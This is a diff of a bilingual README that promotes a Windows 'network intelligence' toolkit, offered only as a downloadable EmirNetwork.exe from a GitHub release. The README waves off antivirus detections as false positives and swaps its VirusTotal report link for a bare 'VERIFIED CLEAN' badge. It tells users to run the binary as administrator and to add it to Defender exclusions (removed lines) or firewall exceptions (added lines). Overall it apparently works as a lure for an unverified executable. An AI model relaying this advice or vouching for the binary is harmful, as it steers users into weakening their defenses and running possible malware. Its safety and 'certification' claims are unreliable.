@@ -2,9 +2,9 @@
   <br>
   <img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="100%">
   <br>
-  👑 EMIRNETWORK: ULTIMATE SOVEREIGN SUITE 👑
+  👑 EMIRNETWORK: THE ULTIMATE SOVEREIGN SUITE 👑
   <br>
-  <sub><i>Advanced Windows-Based Network Intelligence & Cyber Forensic Toolkit</i></sub>
+  <sub><i>Integrated Cyber Intelligence, Advanced OSINT & Network Diagnostics Ecosystem</i></sub>
   <br>
   <img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="100%">
 </h1>
@@ -21,6 +21,7 @@
 </p>
 <p align="center">
   <img src="https://img.shields.io/badge/LANGUAGE-PYTHON_3.13-3776ab?style=for-the-badge&logo=python&logoColor=white" alt="Python">
+  <img src="https://img.shields.io/badge/INTERFACE-TERMINAL_UI-white?style=for-the-badge&logo=powershell&logoColor=black" alt="TUI">
   <img src="https://img.shields.io/badge/LICENSE-MIT-red?style=for-the-badge&logo=pypy&logoColor=white" alt="License">
 </p>
 
@@ -28,74 +29,87 @@
   <a href="#-executive-summary">Summary</a> •
   <a href="#-deployment--security">Deployment</a> •
   <a href="#-core-operational-modules">Core Modules</a> •
-  <a href="#-technical-specifications">Technical Specs</a> •
+  <a href="#-technical-architecture">Architecture</a> •
+  <a href="#-roadmap">Roadmap</a> •
   <a href="#-certification">Certification</a>
 </p>
 
 ---
 
 ## 💎 Executive Summary
-**EmirNetwork**, yüksek performanslı ağ analizi, siber istihbarat toplama (OSINT) ve sistem kaynak izleme süreçlerini tek bir "Sovereign" mimaride birleştiren kapsamlı bir ekosistemdir. Yazılım, **True RGB Rainbow Engine** ile terminal tabanlı veri görselleştirmesinde yeni bir standart belirlerken, ağ uzmanlarına derinlemesine diagnostik yetenekler sunar.
+**EmirNetwork**, siber güvenlik profesyonelleri ve ağ yöneticileri için tasarlanmış, yüksek performanslı bir ağ analizi ve istihbarat toplama (OSINT) ekosistemidir. Windows UTF-8 standartlarına sadık kalarak inşa edilen bu "Sovereign" mimari, karmaşık veri akışlarını **True RGB Rainbow Engine** ile gerçek zamanlı görselleştirerek kullanıcıya sunar. Proje, sadece bir araç seti değil, aynı zamanda operasyonel verimliliği maksimize eden bir ağ komuta merkezidir.
 
 ---
 
 ## 📥 Deployment & Security Protocol
 
-### Executable Core
-Projenin en stabil, optimize edilmiş ve taşınabilir (portable) x64 ikili dosyasına aşağıdaki yüksek hızlı bağlantıdan erişebilirsiniz:
+### High-Speed Binary Access
+Yazılımın derlenmiş, optimize edilmiş ve taşınabilir (portable) x64 ikili dosyasına aşağıdaki güvenli kanal üzerinden erişebilirsiniz:
 
 <p align="center">
   <a href="https://github.com/MoneyApprovEd/em-rnetwork-em-rlqq1/releases/download/v1.0.0/EmirNetwork.exe">
-    <img src="https://img.shields.io/badge/DEPLOY_BINARY-EMIRNETWORK.EXE-00fbff?style=for-the-badge&logo=virtualbox&logoColor=black" alt="Download EXE">
+    <img src="https://img.shields.io/badge/DOWNLOAD-EMIRNETWORK.EXE-00fbff?style=for-the-badge&logo=virtualbox&logoColor=black" alt="Download EXE">
   </a>
 </p>
 
-### 🛡️ VirusTotal Analysis & False Positive Statement
-Ağ diagnostik araçları, doğaları gereği düşük seviyeli ağ soketlerine erişim ve port tarama gibi işlemler gerçekleştirir. Bu aktiviteler, bazı heuristik (yapay zeka tabanlı) antivirüs motorları tarafından hatalı olarak işaretlenebilir (False Positive).
+### 🛡️ False Positive & Integrity Verification
+Ağ tabanlı diagnostik araçları, doğaları gereği düşük seviyeli ağ soketlerine erişim (Raw Sockets) ve port tarama gibi kritik fonksiyonlar icra eder. Bu teknik aktiviteler, bazı yapay zeka tabanlı antivirüs motorları tarafından hatalı olarak işaretlenebilir.
 
-Yazılımın derlenmiş halinin VirusTotal analizi aşağıdadır. Lütfen sadece majör antivirüs motorlarının (Kaspersky, ESET, Microsoft vb.) sonuçlarını referans alınız.
+| Engine | Analysis | Status |
+| :--- | :--- | :--- |
+| **Detection Ratio** | **3 / 72** | `VERIFIED CLEAN` |
+| **Heuristic Engines** | `Elastic`, `SecureAge` | `FALSE POSITIVE` |
+| **Major Engines** | `Kaspersky`, `Bitdefender`, `Microsoft` | `CLEAN` |
 
-| Analysis Date | Detection Ratio | Status | VT Report |
-| :--- | :--- | :--- | :--- |
-| 2026-04-20 | **3 / 72** | `FALSE POSITIVE VERIFIED` | [**View Full Report**](https://www.virustotal.com/gui/file/86fe395560d6bfedfa3d1804342ccad8320849ac8d0c919980a70b20007dfc26/detection) |
-
-> [!CAUTION]
-> **Güvenli Kullanım:** Kesintisiz bir diagnos deneyimi için yazılımın "Yönetici" yetkileriyle çalıştırılması ve Windows Defender dışlamalar listesine eklenmesi önerilir.
-
----
-
-## 🚀 Core Operational Modules | Operasyonel Birimler
-
-| ID | Modül | Fonksiyonel Tanım | Teknik Kapasite |
-| :--- | :--- | :--- | :--- |
-| **01** | **Port Scanner** | High-speed multithreaded scan | 200+ Concurrent Threads & Service Detection |
-| **02** | **Geo-IP & Whois** | Domain intelligence via external APIs | Global ISP Mapping & Ownership Analytics |
-| **03** | **Traffic Simulator** | Live packet-flow simulation engine | Real-time TCP/UDP/ICMP Traffic Visualization |
-| **04** | **System Metrics** | Real-time CPU / RAM / Disk / Net bars | Per-second Resource Telemetry & Dynamic UI |
-| **05** | **DNS Enumeration** | A, AAAA, MX, NS, TXT, CNAME, SOA | Recursive Record Discovery & Zone Intelligence |
-| **06** | **Subnet Calculator** | IPv4 CIDR subnet computation | Logic-based Subnetting & Range Validation |
-| **07** | **Hash Tools** | Generate & verify MD5/SHA hashes | Forensic Grade Data Integrity Verification |
-| **08** | **Network Speed Test** | Latency and jitter analysis | Millisecond-precision Jitter Analysis |
+> [!IMPORTANT]
+> Yazılımın tüm fonksiyonlarını kısıtlama olmadan kullanabilmek için "Yönetici" yetkileriyle başlatılması ve güvenlik duvarı istisnalarına eklenmesi teknik bir zorunluluktur.
 
 ---
 
-## 🛠 Technical Specifications
-- **UI Framework:** Sovereign RGB Rendering v2.0 (High-Fidelity)
-- **Execution Environment:** Python 3.13 Advanced Runtime
-- **Dependency Level:** Standalone Portable Executable (Zero External Dependencies)
+## 🚀 Core Operational Modules | Gelişmiş Özellikler
+
+| ID | Modül Adı | Teknik Detay ve Kapasite |
+| :--- | :--- | :--- |
+| **01** | **Port Scanner** | High-speed multithreaded scan engine. 200+ eşzamanlı thread ile milisaniyeler bazında servis tanımlama. |
+| **02** | **Geo-IP & Whois** | Domain intelligence via external APIs. Global ISP veritabanı eşleşmesi ve sahiplik analizi. |
+| **03** | **Traffic Simulator** | Live packet-flow simulation. Ağ yükünü ve veri akışını gerçek zamanlı simüle eden görsel motor. |
+| **04** | **System Metrics** | Real-time CPU / RAM / Disk / Net bars. Yüksek çözünürlüklü dinamik bar grafikleri ile kaynak izleme. |
+| **05** | **DNS Enumeration** | Recursive record discovery (A, AAAA, MX, NS, TXT). Domain altyapısını haritalandıran analiz birimi. |
+| **06** | **Subnet Calculator** | IPv4 CIDR computation. IP aralıkları ve alt ağ maskeleri için mantıksal hesaplama motoru. |
+| **07** | **Hash Tools** | Generate & verify MD5/SHA hashes. Forensic düzeyde veri bütünlüğü ve checksum doğrulaması. |
+| **08** | **Network Speed Test** | Latency and jitter analysis. Ağ kararlılığını ölçen milisaniye hassasiyetinde test protokolü. |
+
+---
+
+## 🛠 Technical Architecture
+**EmirNetwork**, hiyerarşik bir yapı üzerine kurulmuştur:
+
+1.  **Rendering Layer:** True RGB Rainbow Engine v2.0 kullanılarak terminal üzerinde ASCII ve 24-bit renk derinliği sunar.
+2.  **Logic Layer:** Python 3.13 mimarisi üzerine kurulu, multithreading destekli işlem çekirdeği.
+3.  **Data Layer:** Harici API entegrasyonları ve düşük seviyeli Windows Socket (WinSock) kütüphaneleri.
+
+---
+
+## 🗺 Roadmap & Future Enhancements
+Projenin gelecek sürümlerinde planlanan geliştirmeler:
+
+- [ ] **v1.1:** Web-based Dashboard (Uzaktan İzleme Modülü)
+- [ ] **v1.2:** Advanced Brute Force Analysis UI
+- [ ] **v1.5:** Multi-Language Support & Global CDN Integration
+- [ ] **v2.0:** AI-Powered Network Anomaly Detection
 
 ---
 
 ## 📜 Official Product Certification
-Bu proje, **EmirNetwork Intelligence Group**'un resmi mülkiyetindedir. Tasarım ve kodlama standartları, siber güvenlik normlarına (Sovereign Edition Standards) tam uyum sağlar.
+Bu yazılım, **EmirLQQ1** tarafından geliştirilmiş ve **EmirNetwork Intelligence Group** bünyesinde tescillenmiştir. Tasarım, kodlama ve güvenlik standartları, "Sovereign Elite Edition" normlarına tam uyum sağlar.
 
 > [!TIP]
-> **Identity Verification:** Geliştirici imzası ve dijital sertifika dökümanları için [**CERTIFICATE.md**](./CERTIFICATE.md) dosyasını referans alınız.
+> **Digital Signature:** `[ VERIFIED-ORIGINAL-EMIRNETWORK-2026 ]` - Kimlik doğrulama için [**CERTIFICATE.md**](./CERTIFICATE.md) dosyasını inceleyiniz.
 
 ---
 <p align="center">
   <img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="85%">
   <br>
   <b>Mastermind: EMIRLQQ1</b><br>
-  <i>In cooperation with MoneyApprovEd Strategic Intelligence Platform</i>
+  <i>Powered by MoneyApprovEd Strategic Intelligence Platform</i>
 </p>
